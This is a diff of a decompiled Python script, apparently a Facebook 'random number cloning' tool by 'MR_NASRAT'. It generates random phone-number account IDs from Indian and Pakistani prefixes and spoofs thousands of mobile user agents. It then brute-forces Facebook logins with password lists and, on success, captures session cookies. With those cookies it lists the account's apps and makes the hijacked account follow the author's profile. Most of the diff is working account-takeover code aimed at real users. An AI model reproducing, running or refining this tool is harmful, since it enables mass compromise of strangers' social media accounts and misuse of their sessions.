@@ -1,7 +1,7 @@
+#WRITE  :BY MR_NASRAT
 #DECODE: BY NASRAT
 # Source Generated with Decompyle++
 # File: test.pyc (Python 3.9)
-
 import os
 import sys
 import time
@@ -9,7 +9,7 @@ import requests
 import uuid
 
 
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33m WONER\x1b[0;m   :  \x1b[1;33mNASRAT\x1b[0;m\x1b[1;32m && \x1b[1;33mMOSHTAQ\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m LOY RAYESS KABUL\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-HACKIN TECH\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mHACKIN\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO MR_NASRAT TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mMOSHTAQ\x1b[0;m ======================\n'
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33m WONER\x1b[0;m   :  \x1b[1;33mNASRAT\x1b[0;m\x1b[1;32m && \x1b[1;33mMOSHTAQ\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m LOY RAYESS KABUL\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-HACKIN TECH\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mHACKIN\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.1\n\x1b[1;37m================= \x1b[32;45mMR_NASRAT\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO MR_NASRAT TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mMOSHTAQ\x1b[0;m ======================\n'
 
 def NASRAT():
     os.system('clear')
@@ -42,7 +42,7 @@ def o():
     print(logo)
     print('\t RANDOM NUMBER CRACK')
     print('')
-    print('\x1b[1;32m [1]\x1b[1;33m RANDOM COLONING ')
+    print('\x1b[1;32m [1]\x1b[1;33m RANDOM CLONING  ')
     print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
     print(' \x1b[1;32m[3] \x1b[1;32mJOYIN MY TELEGRAM CHANNEL')
     print(' \x1b[1;32m[4] \x1b[1;32m Follow My FB ID')
@@ -84,7 +84,7 @@ except ModuleNotFoundError:
     os.system('pip install bs4')
     
 def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -96,7 +96,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -110,10 +110,10 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100065533669299', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://mbasic.facebook.com' + str(get), {
+        session.get('https://free.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
             
@@ -163,11 +163,11 @@ $$ |\$$$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |
 $$ | \$$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | AFG  
 \__|  \__|\__|  \__| \______/ \__|  \__|\__|  \__|  \__|                                           
 \033[1;37m==============================================
-\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m \33[0;m\033[1;32m & ℕ𝔸𝕊ℝ𝔸𝕋\033[1;33m\33[0;m
+\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m     \033[1;33mMR.NASRAT\33[0;m
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m LOY RAYESS KABUL
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNasrat99845.git
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m Free
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mHACKIN TECH
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35mTECH HACKIN
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 1.1
 \033[1;37m===============================================
  
@@ -288,19 +288,19 @@ for xd in range(5000):
     j=random.randrange(4200,4900)
     k=random.randrange(44,160)
     l='Mobile Safari/537.36'
-    ag = ['[FB_IAB/FB4A;[FB_IAB/Orca-Android;FBAV/181.0.0.12.78;]', '[FBAN/EMA;FBLC/es_LA;FBAV/372.0.0.15.104;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
+    ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FB_IAB/FB4A;FBAV/378.0.0.18.112;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/401.0.0.24. 77;]', '[FB_IAB/FB4A;FBAV/381.0.0.29. 105;]', '[FBAN/EMA;FBLC/fr_FR;FBAV /333.0.0.12.108;]', '[FB_IAB/FB4A;FBAV/395.0.0.27. 214;]', '[FB_IAB/FB4A;FBAV/387.0.0.24. 102;]', '[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', '[FB_IAB/FB4A;FBAV/377.0.0.22.107;]', '[FB_IAB/FB4A;FBAV/430.0.0.23.113;]', '[FB_IAB/FB4A;FBAV/425.0.0.22.49;]', '[FBAN/EMA;FBLC/en_US;FBAV/363.0.0.6.63;]']
     m = random.choice(ag)
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
     ugen.append(uaku2)
     
     
-    aa='Mozilla/5.0 (Linux; Android ; HLK-L42 '
+    aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['4.3','4.4.4','5.1.1','6','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
     c=' en-us; HONOR '
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -326,7 +326,7 @@ for xd in range(5000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
 	
-    aa='Mozilla/5.0 (Windows NT 10.0;'
+    aa='Mozilla/5.0 (Linux; Android'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
     c=random.choice(['Win64; x64'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -356,7 +356,7 @@ def i():
     print('\033[1;32m============================================')
     print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
     print('\033[1;32m============================================')
-    print('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
+    print('\033[1;36m     \t     Pak CODES\n     \033[1;33m92302, \033[1;33m92345 ,\033[1;33m92306 ,\033[1;33m92303 ...\033[0;97m')
     print('\033[1;32m============================================\n')
     code = input(' PUT CODE : ')
     print("")
@@ -400,7 +400,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -412,28 +412,29 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-    'authority': 'mbasic.facebook.com',
+    'authority': 'p.facebook.com',
     'method': 'GET',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'sb=FHYDZZGMK254lxEqrqHh51L0; datr=FnYDZZSM_QTDHq9xcsf4bsrM; dpr=3; fr=0WS3CAKErGkP33mhH..BlA3YU.yG.AAA.0.0.BlA4SY.AWXTWMqsegY; wd=980x1982',
+    # 'cookie': 'sb=FHYDZZGMK254lxEqrqHh51L0; datr=FnYDZZSM_QTDHq9xcsf4bsrM; m_pixel_ratio=3; wd=360x728; fr=0jjUpsHhXNdD9Kt99..BlB1rC.yG.AAA.0.0.BlB1rf.AWUeU9Zo30c',
     'dpr': '3',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Microsoft Edge";v="113"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5832.204", "Microsoft Edge";v="113.0.1639.41"',
-    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5739.223", "Google Chrome";v="116.0.5739.223"',
+    'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"TECNO CH7n"',
-    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-   
-            lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 9; 100003562) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5739.223 Mobile Safari/537.36',
+    'viewport-width': '980',}
+ 
+            lo = session.post('https://p.facebook.com/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -459,6 +460,7 @@ def rcrack(uid,pwx,tl):
         pass
  
 NASRAT()
+
 
 
 
